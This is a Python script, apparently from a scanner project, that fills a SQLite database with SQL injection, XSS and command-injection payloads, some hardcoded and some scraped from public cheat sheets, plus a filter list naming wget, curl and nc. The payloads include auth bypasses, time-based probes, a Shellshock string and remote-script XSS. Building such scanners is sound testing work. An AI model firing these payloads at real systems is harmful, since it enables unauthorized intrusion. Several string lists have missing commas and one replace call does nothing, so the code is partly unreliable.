#! /usr/bin/python3
from DBManager.Errors import Errors
from src.DBManager.IDBManager import Modes
from src.DBManager.Payloads import Payloads
import requests
from bs4 import BeautifulSoup
import unicodedata
from os import sep, pardir
from os.path import realpath, dirname, join, normpath
from sqlmodel import Session, SQLModel, create_engine

db_dir = dirname(realpath(__file__))
full_path = join(normpath(db_dir + sep + pardir), 'payloads.sqlite')
full_error_path = join(normpath(db_dir + sep + pardir), 'errors.sqlite')
sqlite_url = f"sqlite:///{full_path}"
sqlite_error_url = f"sqlite:///{full_error_path}"


def sql_errors() -> set[str]:
    """
    Scrapes a list of SQL errors from the web and returns it as a set
    @return: set of SQL errors
    """
    return {
        "hi"
    }


def normal_sqli_auth_bypass() -> set[str]:
    """
    @return: hardcoded list of sqli auth bypass payloads
    """
    return {
        r"or true--",  # auth bypass
        r"admin' --",
        r"' group by password having 1=1--",
        r"admin') or '1'='1'#",
        r"admin') or '1'='1'--",
        r' or ""-"',
    }


def aggressive_sqli_auth_bypass() -> set[str]:
    """
    Scrapes the web for a list of SQLI auth bypass payloads
    @return: a generic set of auth bypass payloads
    """
    link = r"https://raw.githubusercontent.com/payloadbox/" \
           r"sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt"
    res = requests.get(link)
    payloads = set(res.text.split("\n"))
    return payloads


def normal_sqli_payloads() -> set[str]:
    """
    @return: hardcoded list of sqli payloads
    """
    return {    # for ori, replace __TIME__ with the amount of seconds you want
        r"sleep(__TIME__)#",    # time based
        r"1 or sleep(__TIME__)#",
        r");waitfor delay '0:0:__TIME__'--",
        r"' AnD SLEEP(__TIME__) ANd '1",
        r" OR 3409=3409 AND ('pytW' LIKE 'pytY",    # error based
        r" and (select substring(@@version,1,1))='X'"
        r"IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
    }


def aggressive_sqli_payloads() -> set[str]:
    """
    scrapes a list of sqli payloads including blind, time based and error based
    @return: set of generic sqli payloads
    """
    link = r"https://raw.githubusercontent.com/payloadbox/" \
           r"sql-injection-payload-list/master/Intruder/detect/Generic_SQLI.txt"
    payloads = set()
    res = requests.get(link)
    payloads.update(res.text.split("\n"))

    for payload in payloads:
        payload.replace("__TIME__", "TBD")   # Again, leaving this for Ori to decide
    return payloads


def normal_xss_payloads() -> set[str]:
    """
    @return: hardcoded list of cherry-picked payloads
    """
    return {
        r"<script>alert('G3N3R1C!_4L3rt_T35t_')",
        r"<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
        r"<IMG SRC=\"javascript:alert('XSS');\">",
        r"<IMG SRC=javascript:alert('XSS')>",
        r"<IMG SRC=JaVaScRiPt:alert('XSS')>",
        r"<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
        r'<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>'
        r'<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>',
        r'<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
        r'<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116'
        r';&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
        r'<IMG SRC="jav	ascript:alert(\'XSS\');">',
        r'<SCRIPT SRC=http://xss.rocks/xss.js?< B >',
        r'<IMG SRC="`<javascript:alert>`(\'XSS\')"',
    }


def normal_ci_payloads() -> set[str]:
    """
    @return: hardcoded list of cherry-picked payloads
    """
    return {
        r"echo hello",
        r"sleep 10",
        r"ls %0A id",
        r"ls %0A sleep 10",
        r"`sleep 10`",
        r"`echo hi`",
        r"$(ls)",
        r"$(sleep 10)",
        r"& ping -i 30 127.0.0.1 &",
        r'() { :;}; /bin/bash -c "sleep 10 && echo vulnerable 10"',
        r"eval('sleep 10')",
        r"&& sleep 10",
        r"|| sleep 10",
        r"{${sleep(10)}}",
        r"& system('sleep 10');",
        r"& sleep 10;",
        r";echo '<script>alert(1)</script>'",
        r'<?php system("sleep 10");?>'
    }


def filter_ci_payloads(old_list: set[str]) -> set[str]:
    """
    Filtering CI Payloads
    @param old_list: unfiltered payloads
    @return: filtered payloads
    """
    things_we_dont_need = [
        "id",
        "wget",
        "curl",
        "dir",
        "ip",
        "ifconfig",
        "nc",
        "perl"
        "whoami",
        "name",
        "net",
        "sleep 1",
        "sleep 3",
        "sleep 5",
        "sleep 6"
    ]
    new_payloads = set()
    for payload in old_list:
        good = True
        for unnecessary in things_we_dont_need:
            if unnecessary in payload or not payload:
                good = False
                break

        if good:
            new_payloads.add(payload)

    return new_payloads


def scrape_aggressive_xss() -> set[str]:
    """
    Scrapes and parses a variety of XSS payloads
    @return: a set of XSS payloads
    """
    xss_normal_link = r"https://xn4k.github.io/pentest/bug%20bounty/ethical%20hacking/XSS-Filter-Evasion-Cheat-Sheet/"
    res = requests.get(xss_normal_link)
    bs = BeautifulSoup(res.text, "html.parser")
    print(normal_xss := set(
        [unicodedata.normalize("NFKC", elem.get_text().rstrip('\n')) for elem in bs.find_all('code')][1:]))
    return normal_xss


def scrape_aggressive_ci() -> set[str]:
    """
    Scrapes and parses a variety of CI payloads
    @return: a set of CI payloads
    """
    ci_normal_link = r"https://hackersonlineclub.com/command-injection-cheatsheet/"
    res = requests.get(ci_normal_link)
    bs = BeautifulSoup(res.text, "html.parser")

    all_payloads = [unicodedata.normalize("NFKC", elem.get_text()) for elem in bs.find_all('pre')]
    normal_ci = set()
    for payload in all_payloads:
        normal_ci.update(payload.split("\r\n"))
    return normal_ci


def write_to_db(vulnerability: str, payloads: set[str], mode: int) -> None:
    """
    Writes a list of payloads to the database
    @param payloads: list of payloads to write
    @param mode: mode to write payloads in
    @param vulnerability: the vulnerability type
    @return: None
    """
    engine = create_engine(sqlite_url, echo=True)

    SQLModel.metadata.create_all(engine)

    with Session(engine) as session:
        for payload in payloads:
            converted_payload = Payloads(vulnerability=vulnerability, payload=payload, mode=mode)
            session.add(converted_payload)
        session.commit()


def write_to_error_db(errors: set[str]) -> None:
    """
    Writing to the SQL Errors DB
    @param errors: Errors to write
    @return: None
    """
    engine = create_engine(sqlite_error_url, echo=True)
    SQLModel.metadata.create_all(engine)

    with Session(engine) as session:
        for error in errors:
            converted_payload = Errors(error=error)
            session.add(converted_payload)
        session.commit()


def workflow() -> None:
    """
    Describes the workflow
    @return: None
    """
    with open(full_path, "w"):  # resetting DB
        pass
    with open(full_error_path, "w"):
        pass

    write_to_db("CI", normal_ci_payloads(), Modes.NORMAL.value)  # writing all vulnerabilities to db
    write_to_db("CI", filter_ci_payloads(scrape_aggressive_ci()), Modes.AGGRESSIVE.value)
    write_to_db("XSS", normal_xss_payloads(), Modes.NORMAL.value)
    write_to_db("XSS", scrape_aggressive_xss(), Modes.AGGRESSIVE.value)
    write_to_db("SQLI", normal_sqli_payloads(), Modes.NORMAL.value)
    write_to_db("SQLI", aggressive_sqli_payloads(), Modes.AGGRESSIVE.value)
    write_to_db("SQLI Auth", normal_sqli_auth_bypass(), Modes.NORMAL.value)
    write_to_db("SQLI Auth", aggressive_sqli_auth_bypass(), Modes.AGGRESSIVE.value)
    write_to_error_db(sql_errors())


workflow()
